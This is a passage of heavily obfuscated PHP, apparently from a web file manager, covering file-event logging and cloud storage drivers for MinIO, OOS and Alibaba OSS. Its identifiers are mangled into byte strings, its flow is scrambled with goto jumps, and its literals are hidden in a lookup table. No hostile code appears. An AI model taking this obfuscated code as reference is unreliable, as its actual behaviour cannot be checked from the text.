$_SERVER[Î¿—”òá]; $f…Øˆ…Ã¤È = Model($DŒ£Ó”¦Î[1110])->sourceInfo($AÀÒæ‡È§); $bå­•îä† = $f…Øˆ…Ã¤È[$DŒ£Ó”¦Î[28]]; return $this->addEvent($f…Øˆ…Ã¤È[$DŒ£Ó”¦Î[461]], $DŒ£Ó”¦Î[2063], $bå­•îä†); } public function eventShare($eì¾Õ‚Í‘Œ, $a› µ¹ğŸŒ) { return $this->addEvent($eì¾Õ‚Í‘Œ, $_SERVER[Î¿—”òá][2074], $a› µ¹ğŸŒ); } public function eventMove($CôÙÄ£¯Ú, $Dø†õİ“‹Œ, $E¤© Ã‡éƒ) { goto E´Âí¤™‚—; fŠÀÈª´ã: $this->addEvent($CôÙÄ£¯Ú, $e¡ĞªÈèÕŞ[492], $BÊòŞÜøà); $B•â¿‡  = $b£›ÕœïòÅ->sourceInfo($CôÙÄ£¯Ú); $BÊòŞÜøà = array($e¡ĞªÈèÕŞ[369] => $B•â¿‡ [$e¡ĞªÈèÕŞ[369]], $e¡ĞªÈèÕŞ[28] => $B•â¿‡ [$e¡ĞªÈèÕŞ[28]]); goto DÈÚ³‚º; DÈÚ³‚º: $this->addEvent($Dø†õİ“‹Œ, $e¡ĞªÈèÕŞ[2289], $BÊòŞÜøà); goto EÃ‡ÁÔ£ÊË; d¿ëµÈè¾‘: $e·ÅãŠÆ÷ = $b£›ÕœïòÅ->sourceInfo($Dø†õİ“‹Œ); $bÓíšÏºÓ = $b£›ÕœïòÅ->sourceInfo($E¤© Ã‡éƒ); $BÊòŞÜøà = array($e¡ĞªÈèÕŞ[1000] => $Dø†õİ“‹Œ, $e¡ĞªÈèÕŞ[2285] => $e·ÅãŠÆ÷[$e¡ĞªÈèÕŞ[28]], $e¡ĞªÈèÕŞ[2286] => $e·ÅãŠÆ÷[$e¡ĞªÈèÕŞ[466]], $e¡ĞªÈèÕŞ[1001] => $E¤© Ã‡éƒ, $e¡ĞªÈèÕŞ[2287] => $bÓíšÏºÓ[$e¡ĞªÈèÕŞ[28]], $e¡ĞªÈèÕŞ[2288] => $bÓíšÏºÓ[$e¡ĞªÈèÕŞ[466]]); goto fŠÀÈª´ã; E´Âí¤™‚—: $e¡ĞªÈèÕŞ =& $_SERVER[Î¿—”òá]; $b£›ÕœïòÅ = Model($e¡ĞªÈèÕŞ[1110]); $B•â¿‡  = $b£›ÕœïòÅ->sourceInfo($CôÙÄ£¯Ú); goto d¿ëµÈè¾‘; EÃ‡ÁÔ£ÊË: } public function eventCopy($Aæê’¬Ú) { $this->eventCreate($Aæê’¬Ú, $_SERVER[Î¿—”òá][490]); } public function eventRename($eÜ‚¡­ŠùÉ, $a¶¯Û‹ßÉæ, $CŠ˜ø¨»ÜÒ) { $cÙâÌÕ”˜„ =& $_SERVER[Î¿—”òá]; $E‚èÚó…• = array($cÙâÌÕ”˜„[1000] => $a¶¯Û‹ßÉæ, $cÙâÌÕ”˜„[1001] => $CŠ˜ø¨»ÜÒ); return $this->addEvent($eÜ‚¡­ŠùÉ, $cÙâÌÕ”˜„[1123], $E‚èÚó…•); } public function eventAddComment($Aß•ÆŞºğ, $a³®Â¼ÎÂÛ) { return $this->addEvent($Aß•ÆŞºğ, $_SERVER[Î¿—”òá][2290], $a³®Â¼ÎÂÛ); } public function eventAddDesc($EßŸÜÔˆÆÕ, $A®ô¬‘È«§) { return $this->addEvent($EßŸÜÔˆÆÕ, $_SERVER[Î¿—”òá][2291], $A®ô¬‘È«§); } public function listBySource($a¯‚Û°Ã¼¹) { goto BÕ¬®‡»ä; e¤‹ß£©¹†: if ($A‘¶óÈ‹‘[$B±ºª„ÓÕº[370]] == $B±ºª„ÓÕº[83]) { $dÉ²³ß†… = Model($B±ºª„ÓÕº[1110])->listSearchChildren($a¯‚Û°Ã¼¹, 20000); $dÉ²³ß†…[] = $a¯‚Û°Ã¼¹ . $B±ºª„ÓÕº[361]; $F£¹›ù…Ô› = array($B±ºª„ÓÕº[369] => array($B±ºª„ÓÕº[7], $dÉ²³ß†…)); } $d…ïÒ‚…×Ú = $this->where($F£¹›ù…Ô›)->order($B±ºª„ÓÕº[2292])->selectPage(); if ($d…ïÒ‚…×Ú[$B±ºª„ÓÕº[351]][$B±ºª„ÓÕº[352]] == 0) { $d…ïÒ‚…×Ú[$B±ºª„ÓÕº[351]][$B±ºª„ÓÕº[352]] = 1; $d…ïÒ‚…×Ú[$B±ºª„ÓÕº[354]] = array(array($B±ºª„ÓÕº[383] => $a¯‚Û°Ã¼¹, $B±ºª„ÓÕº[2275] => $A‘¶óÈ‹‘[$B±ºª„ÓÕº[461]], $B±ºª„ÓÕº[1420] => $A‘¶óÈ‹‘[$B±ºª„ÓÕº[378]], $B±ºª„ÓÕº[388] => $B±ºª„ÓÕº[2293], $B±ºª„ÓÕº[389] => $A‘¶óÈ‹‘[$B±ºª„ÓÕº[187]], $B±ºª„ÓÕº[1422] => $B±ºª„ÓÕº[33])); } goto c„¡‹æ’ìì; BÕ¬®‡»ä: $B±ºª„ÓÕº =& $_SERVER[Î¿—”òá]; $A‘¶óÈ‹‘ = Model($B±ºª„ÓÕº[1110])->sourceInfo($a¯‚Û°Ã¼¹); $F£¹›ù…Ô› = array($B±ºª„ÓÕº[383] => $a¯‚Û°Ã¼¹); goto e¤‹ß£©¹†; c„¡‹æ’ìì: return $this->eventListParse($d…ïÒ‚…×Ú, $a¯‚Û°Ã¼¹); goto DÑš´±µŒË; DÑš´±µŒË: } private function eventListParse($e™ƒ×¿‡µ‹, $CŞ¦…î¢Ü«) { goto EÂÙ‰Ò—À®; a¢ªõ…¯Í²: return $e™ƒ×¿‡µ‹; goto F½–Ã²İ½; EÂÙ‰Ò—À®: $BˆÅõÃ´ø¹ =& $_SERVER[Î¿—”òá]; $b›¨Õâ—¿Ñ = $e™ƒ×¿‡µ‹[$BˆÅõÃ´ø¹[354]]; $aÃ¡ÃëŞ¸ù = array_to_keyvalue($b›¨Õâ—¿Ñ, $BˆÅõÃ´ø¹[33], $BˆÅõÃ´ø¹[369]); goto F¥ÕÄƒ¡”ã; F¥ÕÄƒ¡”ã: $Eµ„ª“çâ¾ = array_to_keyvalue($b›¨Õâ—¿Ñ, $BˆÅõÃ´ø¹[33], $BˆÅõÃ´ø¹[2281]); foreach ($b›¨Õâ—¿Ñ as $aÙÛóÂ¯Õó) { $eİğ ŠÙË‘ = $aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[405]]; if ($aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[29]] == $BˆÅõÃ´ø¹[492] && isset($eİğ ŠÙË‘[$BˆÅõÃ´ø¹[1000]])) { $aÃ¡ÃëŞ¸ù[] = $eİğ ŠÙË‘[$BˆÅõÃ´ø¹[1000]] . $BˆÅõÃ´ø¹[33]; $aÃ¡ÃëŞ¸ù[] = $eİğ ŠÙË‘[$BˆÅõÃ´ø¹[1001]] . $BˆÅõÃ´ø¹[33]; } if ($aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[29]] == $BˆÅõÃ´ø¹[2289] && isset($eİğ ŠÙË‘[$BˆÅõÃ´ø¹[369]])) { $aÃ¡ÃëŞ¸ù[] = $eİğ ŠÙË‘[$BˆÅõÃ´ø¹[369]] . $BˆÅõÃ´ø¹[33]; } } $aÃ¡ÃëŞ¸ù = array_merge($aÃ¡ÃëŞ¸ù, $Eµ„ª“çâ¾, array($CŞ¦…î¢Ü« . $BˆÅõÃ´ø¹[33])); goto AÇ¨ºÈì; AÇ¨ºÈì: $aÃ¡ÃëŞ¸ù = array_unique($aÃ¡ÃëŞ¸ù); $cÒˆ¤å±…º = array_unique(array_to_keyvalue($b›¨Õâ—¿Ñ, $BˆÅõÃ´ø¹[33], $BˆÅõÃ´ø¹[1429])); $D’ß‡Šœœ¯ = Model($BˆÅõÃ´ø¹[477])->userListInfo($cÒˆ¤å±…º); goto A¹Ëç˜††é; A¹Ëç˜††é: $dÀÂà—ÀÈ = Model($BˆÅõÃ´ø¹[749])->sourceListInfo($aÃ¡ÃëŞ¸ù, !0); foreach ($b›¨Õâ—¿Ñ as &$aÙÛóÂ¯Õó) { if ($aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[29]] == $BˆÅõÃ´ø¹[492] && isset($aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[405]][$BˆÅõÃ´ø¹[1000]])) { $aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[405]][$BˆÅõÃ´ø¹[1000]] = $dÀÂà—ÀÈ[$aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[405]][$BˆÅõÃ´ø¹[1000]]]; $aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[405]][$BˆÅõÃ´ø¹[1001]] = $dÀÂà—ÀÈ[$aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[405]][$BˆÅõÃ´ø¹[1001]]]; } if ($aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[29]] == $BˆÅõÃ´ø¹[2289] && isset($aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[405]][$BˆÅõÃ´ø¹[369]])) { $aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[405]][$BˆÅõÃ´ø¹[369]] = $dÀÂà—ÀÈ[$aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[405]][$BˆÅõÃ´ø¹[369]]]; } $aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[391]] = $dÀÂà—ÀÈ[$aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[369]]]; $aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[2294]] = $dÀÂà—ÀÈ[$aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[2281]]]; if ($aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[29]] == $BˆÅõÃ´ø¹[2063]) { $aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[2294]] = $aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[391]]; $aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[2281]] = $aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[2294]][$BˆÅõÃ´ø¹[369]]; $aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[391]] = !1; $aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[369]] = $BˆÅõÃ´ø¹[33]; } $aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[2237]] = $D’ß‡Šœœ¯[$aÙÛóÂ¯Õó[$BˆÅõÃ´ø¹[1429]]]; } $e™ƒ×¿‡µ‹[$BˆÅõÃ´ø¹[354]] = $b›¨Õâ—¿Ñ; goto a¢ªõ…¯Í²; F½–Ã²İ½: } public function removeBySource($B…›§àåÙÊ) { $Fİ·Ë†áä‹ = array($_SERVER[Î¿—”òá][383] => $B…›§àåÙÊ); $this->where($Fİ·Ë†áä‹)->remove(); } } goto EºƒËøÍ…“; b»ö‹©ñÓÇ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Fªä„›Èô) { parent::__construct($Fªä„›Èô); $this->signatureVersion($_SERVER[Î¿—”òá][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($c•‰¸ä¬‹í) { parent::__construct($c•‰¸ä¬‹í); $this->signatureVersion($_SERVER[Î¿—”òá][200]); } public function fileOutLink($BÃÙ®Ä ­Ñ) { $b¤è‡ì÷î– =& $_SERVER[Î¿—”òá]; if (substr($BÃÙ®Ä ­Ñ, 0, 7) == $b¤è‡ì÷î–[1108]) { $BÃÙ®Ä ­Ñ = $b¤è‡ì÷î–[1109] . substr($BÃÙ®Ä ­Ñ, 7); } header($b¤è‡ì÷î–[156] . $BÃÙ®Ä ­Ñ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($bâ¶ì™°ò) { parent::__construct(); include_once SDK_DIR . $_SERVER[Î¿—”òá][1164]; $this->_init($bâ¶ì™°ò); } public function _init($Dõèä¥¢“) { foreach ($Dõèä¥¢“ as $D‚ê´À¥ÙÕ => $aëÑ±‡Ì—Ã) { if (isset($this->{$D‚ê´À¥ÙÕ})) { $this->{$D‚ê´À¥ÙÕ} = $aëÑ±‡Ì—Ã; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Î¿—”òá][1165], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto F÷•äùÁ›; bÖ” Ø¡™ï: $Aİå­ê«×->addAllowedOrigin($EÊßêçÆâë[1166]); $Aİå­ê«×->addAllowedMethod($EÊßêçÆâë[1167]); $Aİå­ê«×->addAllowedMethod($EÊßêçÆâë[1168]); goto E‘ŠÃ®é°; E‘ŠÃ®é°: $Aİå­ê«×->addAllowedMethod($EÊßêçÆâë[1169]); $Aİå­ê«×->addAllowedMethod($EÊßêçÆâë[1170]); $Aİå­ê«×->addAllowedMethod($EÊßêçÆâë[155]); goto aš‚“‘†ƒ‡; b¾“…ÄË‘Ó: $F»÷±…ğœ‹->addRule($Aİå­ê«×); try { $this->client->putBucketCors($this->bucket, $F»÷±…ğœ‹); } catch (OSS\Core\OssException $aŒÙ¨ÊˆâÙ) { return !1; } return !0; goto d“¢¶‹‚Ì; F÷•äùÁ›: $EÊßêçÆâë =& $_SERVER[Î¿—”òá]; $F»÷±…ğœ‹ = new OSS\Model\CorsConfig(); $Aİå­ê«× = new OSS\Model\CorsRule(); goto bÖ” Ø¡™ï; aš‚“‘†ƒ‡: $Aİå­ê«×->setMaxAgeSeconds(600); $Aİå­ê«×->addExposeHeader($EÊßêçÆâë[1171]); $Aİå­ê«×->addAllowedHeader($EÊßêçÆâë[1166]); goto b¾“…ÄË‘Ó; d“¢¶‹‚Ì: } public function getBucketCors() { goto Cä­Ñƒ’ù—; f‚Ö·ªáÎ: return array($a×½¬¥ßñî[175] => isset($dß‘ÀÚ“·[0]) ? $dß‘ÀÚ“·[0] : $a×½¬¥ßñî[33], $a×½¬¥ßñî[179] => $eÙ¶Ôãöé¥, $a×½¬¥ßñî[1172] => $E†áÈº¥µ, $a×½¬¥ßñî[1173] => isset($c•ë‚«‚˜[0]) ? $c•ë‚«‚˜[0] : $a×½¬¥ßñî[33], $a×½¬¥ßñî[177] => isset($cŒÂ‘ÌÜÎ[0]) ? $cŒÂ‘ÌÜÎ[0] : $a×½¬¥ßñî[33]); goto cï³ĞÕ“ßØ; f†¢¼¾³¦: if (!$b£Ç¾ø«Ùƒ || !($bí—‚ƒÇÍ† = $b£Ç¾ø«Ùƒ->getRules())) { return null; } $dß‘ÀÚ“· = $bí—‚ƒÇÍ†[0]->getAllowedOrigins(); $eÙ¶Ôãöé¥ = $bí—‚ƒÇÍ†[0]->getAllowedMethods(); goto FğÇêÍÒæ’; Cä­Ñƒ’ù—: $a×½¬¥ßñî =& $_SERVER[Î¿—”òá]; $b£Ç¾ø«Ùƒ = null; try { $b£Ç¾ø«Ùƒ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $cË¬³¹ìéÅ) { return null; } goto f†¢¼¾³¦; FğÇêÍÒæ’: $E†áÈº¥µ = $bí—‚ƒÇÍ†[0]->getMaxAgeSeconds(); $c•ë‚«‚˜ = $bí—‚ƒÇÍ†[0]->getExposeHeaders(); $cŒÂ‘ÌÜÎ = $bí—‚ƒÇÍ†[0]->getAllowedHeaders(); goto f‚Ö·ªáÎ; cï³ĞÕ“ßØ: } public function isBucketCors() { goto C±±Ç‘Ù¿Ç; C±±Ç‘Ù¿Ç: $B‘òØÁŸšç =& $_SERVER[Î¿—”òá]; $E³’Æï±İÂ = $this->getBucketCors(); if (!$E³’Æï±İÂ || !is_array($E³’Æï±İÂ)) { return !1; } goto eĞËæŞÒÜ; eĞËæŞÒÜ: if ($E³’Æï±İÂ[$B‘òØÁŸšç[175]] != $B‘òØÁŸšç[176] || $E³’Æï±İÂ[$B‘òØÁŸšç[177]] != $B‘òØÁŸšç[176]) { return !1; } $FÚ­ï¶­ò = array_map($B‘òØÁŸšç[178], $E³’Æï±İÂ[$B‘òØÁŸšç[179]]); if (!is_array($FÚ­ï¶­ò)) { $FÚ­ï¶­ò = array(); } goto dƒó„áö®î; dƒó„áö®î: $F¬À°§ìŒ = array($B‘òØÁŸšç[180], $B‘òØÁŸšç[181], $B‘òØÁŸšç[182], $B‘òØÁŸšç[183], $B‘òØÁŸšç[184]); $Aªµ»ëŞ£ = array_diff($F¬À°§ìŒ, $FÚ­ï¶­ò); return empty($Aªµ»ëŞ£); goto FÂƒÍ¸¶Åñ; FÂƒÍ¸¶Åñ: } public function mkfile($FÃ†Ê¶î°, $Bª¸Œ˜†ø = '', $a…™×… = REPEAT_RENAME) { $f‹‡ß×Ï®Ô = $this->setContent($FÃ†Ê¶î°, $Bª¸Œ˜†ø); if ($f‹‡ß×Ï®Ô !== !1) { return $this->getPathOuter($FÃ†Ê¶î°); } return !1; } public function mkdir($e±Œ‚İò‰, $BßÑïµ¹… = REPEAT_SKIP) { if ($this->_isFolder($e±Œ‚İò‰)) { return $this->getPathOuter($e±Œ‚İò‰); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($e±Œ‚İò‰)); } catch (OSS\Core\OssException $a¹˜ğ²™÷ë) { return !1; } return $this->getPathOuter($e±Œ‚İò‰); } private function fileList($b›‚µ„Ù§™, $D‹™Ï†ƒô‘ = '', $Cù¿ÉÕ…µ® = 0) { goto E—ÃÜ“÷äï; E—ÃÜ“÷äï: $DõÓ¹ê½İ =& $_SERVER[Î¿—”òá]; $b›‚µ„Ù§™ = trim($b›‚µ„Ù§™, $DõÓ¹ê½İ[8]); $b½êáÑƒØ® = empty($b›‚µ„Ù§™) ? $DõÓ¹ê½İ[33] : $b›‚µ„Ù§™ . $DõÓ¹ê½İ[8]; goto EÊ¦Ú±…ÔÑ; eİÂÚ›““í: while (!0) { $Eˆ³‚îÜ¿Ò = array($DõÓ¹ê½İ[1174] => $D‹™Ï†ƒô‘, $DõÓ¹ê½İ[186] => $b½êáÑƒØ®, $DõÓ¹ê½İ[1175] => $eì¥³Š¿, $DõÓ¹ê½İ[1176] => $E×¸ÌØÁßŞ); try { $A¨–Ú­í = $this->client->listObjects($this->bucket, $Eˆ³‚îÜ¿Ò); } catch (OSS\Core\OssException $E·ÂÖ–ŸŒ) { break; } $E×¸ÌØÁßŞ = $A¨–Ú­í->getNextMarker(); $dãÜš‚„ˆ® = $A¨–Ú­í->getObjectList(); $bÎèíŒ´ = $A¨–Ú­í->getPrefixList(); foreach ($dãÜš‚„ˆ® as $c±ïôÄéŒ) { if ($c±ïôÄéŒ->getKey() == $b½êáÑƒØ®) { continue; } $BÁÉÜƒÅÊ = $c±ïôÄéŒ->getKey(); if ($Cù¿ÉÕ…µ®) { $BÁÉÜƒÅÊ = array($DõÓ¹ê½İ[28] => $BÁÉÜƒÅÊ, $DõÓ¹ê½İ[77] => $c±ïôÄéŒ->getSize(), $DõÓ¹ê½İ[190] => strtotime($c±ïôÄéŒ->getLastModified())); } $fÃ‹¹¥×[] = $BÁÉÜƒÅÊ; } foreach ($bÎèíŒ´ as $BŒ†ÛÅŸìá) { $EáÈ¼¹ÊÅŸ[] = $BŒ†ÛÅŸìá->getPrefix(); } if ($E×¸ÌØÁßŞ === $DõÓ¹ê½İ[33]) { break; } } return array($DõÓ¹ê½İ[74] => $EáÈ¼¹ÊÅŸ, $DõÓ¹ê½İ[73] => $fÃ‹¹¥×); goto dÔÄ–İš°‰; EÊ¦Ú±…ÔÑ: $E×¸ÌØÁßŞ = $DõÓ¹ê½İ[33]; $eì¥³Š¿ = 1000; $EáÈ¼¹ÊÅŸ = $fÃ‹¹¥× = array(); goto eİÂÚ›““í; dÔÄ–İš°‰: } public function copyFile($AëÃîÛ˜‘², $a§—çœ¾») { $dßîøöô = $this->size($AëÃîÛ˜‘²); if ($dßîøöô < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $AëÃîÛ˜‘², $this->bucket, $this->pathEncode($a§—çœ¾»)); } catch (OSS\Core\OssException $d‡½ÄˆËÖ…) { return !1; } return $this->getPathOuter($a§—çœ¾»); } $Dê§Œ¡ÉğĞ = $this->multiCopyObject($AëÃîÛ˜‘², $a§—çœ¾», $dßîøöô); return $Dê§Œ¡ÉğĞ ? $this->getPathOuter($a§—çœ¾») : !1; } private function multiCopyObject($Aµìç»ä“õ, $bÊ’‡·¨†ù, $e‹«Ú¬‡¸à) { $dø†¥ÜÈÄĞ =& $_SERVER[Î¿—”òá]; try { goto F¼Ü‡âÄÆ¤; F¼Ü‡âÄÆ¤: $bó¼ëŒÊ… = array(); if ($cĞ—µ¥‡Šá = $this->hashMd5($Aµìç»ä“õ)) { $bó¼ëŒÊ… = array(OSS\OssClient::OSS_HEADERS => array($dø†¥ÜÈÄĞ[1177] => $cĞ—µ¥‡Šá)); } $cò™°¢˜Ù = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($bÊ’‡·¨†ù), $bó¼ëŒÊ…); goto céÄÏÆÒÒÙ; D‚ù·ŒÂê‰: $b°‹îç‚ˆ… = array(); foreach ($AÖõÚ´Î¿ as $eª‰ÁŠ¯Êœ => $AÑµˆ‹Šò) { $b°‹îç‚ˆ…[] = array($dø†¥ÜÈÄĞ[1181] => $eª‰ÁŠ¯Êœ + 1, $dø†¥ÜÈÄĞ[1182] => $AÑµˆ‹Šò); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($bÊ’‡·¨†ù), $cò™°¢˜Ù, $b°‹îç‚ˆ…); goto b§»ã»Ûì; dæ‰¾ïĞåÁ: $f„Æ›Ë‡ëÆ = 1024 * 1024 * 10; $EÉæ‚è¥Ò = $this->client->generateMultiuploadParts($e‹«Ú¬‡¸à, $f„Æ›Ë‡ëÆ); foreach ($EÉæ‚è¥Ò as $eª‰ÁŠ¯Êœ => $e¿·çæçÍí) { $d¦¶Ûª—« = $fœ†ÔÓ¶óê + (int) $e¿·çæçÍí[$dø†¥ÜÈÄĞ[1178]]; $aë¼õØÄÀ¸ = (int) $e¿·çæçÍí[$dø†¥ÜÈÄĞ[325]] + $d¦¶Ûª—« - 1; $cÃÛ—ÃË‚£ = array($dø†¥ÜÈÄĞ[1179] => $d¦¶Ûª—«, $dø†¥ÜÈÄĞ[1180] => $aë¼õØÄÀ¸); $AÖõÚ´Î¿[] = $this->client->uploadPartCopy($this->bucket, $Aµìç»ä“õ, $this->bucket, $this->pathEncode($bÊ’‡·¨†ù), $c¡õŸº¥ñ, $cò™°¢˜Ù, $cÃÛ—ÃË‚£); $c¡õŸº¥ñ = $c¡õŸº¥ñ + 1; } goto D‚ù·ŒÂê‰; céÄÏÆÒÒÙ: $c¡õŸº¥ñ = 1; $fœ†ÔÓ¶óê = 0; $AÖõÚ´Î¿ = array(); goto dæ‰¾ïĞåÁ; b§»ã»Ûì: } catch (OSS\Core\OssException $F‡ù¯æ±Æ) { return !1; } return !0; } public function moveFile($aŞğÜïÍ†ğ, $d±‰·Ê”ã˜) { if ($this->copyFile($aŞğÜïÍ†ğ, $d±‰·Ê”ã˜)) { $this->remove($aŞğÜïÍ†ğ); return $this->getPathOuter($d±‰·Ê”ã˜); } return !1; } public function delFile($a½Šœ…ß²) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($a½Šœ…ß²)); } catch (OSS\Core\OssException $aª‚ªäÓ¶ó) { return !1; } return !0; } public function delFolder($BŠœçÜ–‚¬) { $cí™‚¶çŒÍ =& $_SERVER[Î¿—”òá]; $DÖ¢‘Œš—ì = $this->fileList($BŠœçÜ–‚¬); if (!empty($BŠœçÜ–‚¬) && !in_array(trim($BŠœçÜ–‚¬, $cí™‚¶çŒÍ[8]) . $cí™‚¶çŒÍ[8], $DÖ¢‘Œš—ì[$cí™‚¶çŒÍ[73]])) { $DÖ¢‘Œš—ì[$cí™‚¶çŒÍ[73]][] = trim($BŠœçÜ–‚¬, $cí™‚¶çŒÍ[8]) . $cí™‚¶çŒÍ[8]; } foreach (array_chunk($DÖ¢‘Œš—ì[$cí™‚¶çŒÍ[73]], 1000) as $Eò˜´ã¢ÔÔ) { try { $this->client->deleteObjects($this->bucket, $Eò˜´ã¢ÔÔ); } catch (OSS\Core\OssException $B•É„››ô³) { continue; } } return !0; } public function rename($eÃìÀîê‚¸, $CöùĞ×ğ›) { return $this->renameObject($eÃìÀîê‚¸, $CöùĞ×ğ›); } private function fileInfo($c„áÜ©„Êî, $bâöºä¹– = array()) { goto b–°Œ¿ÒÕÖ; Döä¾Šˆ: if (isset($bâöºä¹–[$AœÖµƒßÚÙ[77]])) { $a…”å‘Šæ[$AœÖµƒßÚÙ[77]] = $bâöºä¹–[$AœÖµƒßÚÙ[77]]; } if (isset($bâöºä¹–[$AœÖµƒßÚÙ[107]])) { $a…”å‘Šæ[$AœÖµƒßÚÙ[107]] = $bâöºä¹–[$AœÖµƒßÚÙ[107]]; } if (isset($bâöºä¹–[$AœÖµƒßÚÙ[190]]) && !trim($a…”å‘Šæ[$AœÖµƒßÚÙ[107]])) { $a…”å‘Šæ[$AœÖµƒßÚÙ[107]] = $bâöºä¹–[$AœÖµƒßÚÙ[190]]; } goto AÛíÜ›ˆìÍ; AÛíÜ›ˆìÍ: return $a…”å‘Šæ; goto FØ™»×ÑÎ¨; b–°Œ¿ÒÕÖ: $AœÖµƒßÚÙ =& $_SERVER[Î¿—”òá]; $a…”å‘Šæ = array($AœÖµƒßÚÙ[28] => $this->pathThis($c„áÜ©„Êî), $AœÖµƒßÚÙ[75] => $this->getPathOuter($c„áÜ©„Êî), $AœÖµƒßÚÙ[29] => $AœÖµƒßÚÙ[167], $AœÖµƒßÚÙ[187] => 0, $AœÖµƒßÚÙ[107] => 0, $AœÖµƒßÚÙ[77] => 0, $AœÖµƒßÚÙ[160] => $this->ext($c„áÜ©„Êî), $AœÖµƒßÚÙ[188] => !0, $AœÖµƒßÚÙ[189] => !0); if (empty($bâöºä¹–)) { $B‚ù²©Î¾Î = $this->objectMeta($c„áÜ©„Êî); if (!$B‚ù²©Î¾Î) { return $a…”å‘Šæ; } $bâöºä¹– = array($AœÖµƒßÚÙ[107] => strtotime($B‚ù²©Î¾Î[$AœÖµƒßÚÙ[1183]]), $AœÖµƒßÚÙ[77] => $B‚ù²©Î¾Î[$AœÖµƒßÚÙ[1184]] + 0); } goto Döä¾Šˆ; FØ™»×ÑÎ¨: } private function folderInfo($c¬¨×¨å†‰, $e«¸âÅÔêØ = array()) { $DÉ¿†ôÅ«› =& $_SERVER[Î¿—”òá]; $F¸•Ì´áŠá = array($DÉ¿†ôÅ«›[28] => $this->pathThis($c¬¨×¨å†‰), $DÉ¿†ôÅ«›[75] => $this->getPathOuter($DÉ¿†ôÅ«›[8] . $c¬¨×¨å†‰), $DÉ¿†ôÅ«›[29] => $DÉ¿†ôÅ«›[76], $DÉ¿†ôÅ«›[187] => 0, $DÉ¿†ôÅ«›[107] => 0, $DÉ¿†ôÅ«›[188] => !0, $DÉ¿†ôÅ«›[189] => !0); if (empty($e«¸âÅÔêØ)) { $c¬¨×¨å†‰ = rtrim($c¬¨×¨å†‰, $DÉ¿†ôÅ«›[8]) . $DÉ¿†ôÅ«›[8]; $d†ßªç·¾ƒ = $this->objectMeta($c¬¨×¨å†‰); if (!$d†ßªç·¾ƒ) { return $F¸•Ì´áŠá; } $e«¸âÅÔêØ = array($DÉ¿†ôÅ«›[187] => $d†ßªç·¾ƒ[$DÉ¿†ôÅ«›[1185]][$DÉ¿†ôÅ«›[1186]], $DÉ¿†ôÅ«›[107] => strtotime($d†ßªç·¾ƒ[$DÉ¿†ôÅ«›[1183]])); } if (isset($e«¸âÅÔêØ[$DÉ¿†ôÅ«›[107]])) { $F¸•Ì´áŠá[$DÉ¿†ôÅ«›[107]] = $e«¸âÅÔêØ[$DÉ¿†ôÅ«›[107]]; } if (isset($e«¸âÅÔêØ[$DÉ¿†ôÅ«›[187]])) { $F¸•Ì´áŠá[$DÉ¿†ôÅ«›[187]] = $e«¸âÅÔêØ[$DÉ¿†ôÅ«›[187]]; } return $F¸•Ì´áŠá; } public function listPath($bè·Î¹°”, $bÃİƒœœÊ¨ = false) { $E«”ñÙ¥öÔ =& $_SERVER[Î¿—”òá]; $d•Ò«¸ÅÂÇ = $this->fileList($bè·Î¹°”, $E«”ñÙ¥öÔ[8], !0); foreach ($d•Ò«¸ÅÂÇ[$E«”ñÙ¥öÔ[74]] as $D›³–¢ßá¸ => $BØ›Û†ŒŠ) { $d•Ò«¸ÅÂÇ[$E«”ñÙ¥öÔ[74]][$D›³–¢ßá¸] = $this->folderInfo($BØ›Û†ŒŠ, $BØ›Û†ŒŠ); } foreach ($d•Ò«¸ÅÂÇ[$E«”ñÙ¥öÔ[73]] as $D›³–¢ßá¸ => $BØ›Û†ŒŠ) { $d•Ò«¸ÅÂÇ[$E«”ñÙ¥öÔ[73]][$D›³–¢ßá¸] = $this->fileInfo($BØ›Û†ŒŠ[$E«”ñÙ¥öÔ[28]], $BØ›Û†ŒŠ); } return $d•Ò«¸ÅÂÇ; } public function has($dáÊä¥¼Åõ, $eÀœ¸Œ©Á´ = false, $dÒ·¦âï’ = true) { goto B¼ˆÖ¬­ÛÊ; aÕ¼•Ä‰…²: $bŒ™•„‡ª¦ = 0; while (!0) { $fĞ“ÂÓˆàÁ = array($d½‚äĞ®‡[1174] => $d½‚äĞ®‡[8], $d½‚äĞ®‡[186] => 